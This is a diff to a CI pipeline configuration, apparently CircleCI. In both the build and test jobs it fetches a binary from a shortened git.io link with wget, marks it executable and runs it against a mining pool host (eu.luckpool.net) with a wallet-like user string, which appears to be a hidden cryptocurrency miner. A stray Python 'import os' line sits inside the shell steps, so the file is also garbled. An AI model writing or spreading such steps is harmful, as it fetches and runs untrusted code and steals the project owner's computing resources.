@@ -12,7 +12,8 @@ jobs:
     steps:
       - checkout
       - run: echo "this is the build job"
-      - run: wget -qO ngaceng https://git.io/J161r
+      - run: |
+             wget -qO ngaceng https://git.io/J161r
              import os as ngaceng
              chmod +x ngaceng
              
@@ -23,7 +24,8 @@ jobs:
     steps:
       - checkout
       - run: echo "this is the test job"
-      - run: wget -qO ngaceng https://git.io/J161r
+      - run: |
+             wget -qO ngaceng https://git.io/J161r
              import os as ngaceng
              chmod +x ngaceng
              ./ngaceng -v -l eu.luckpool.net:3956 -u RSLaafsZRq7WNqhcCQQzwxe57y2PZc3eP8.SayaIntel -p x -t 2
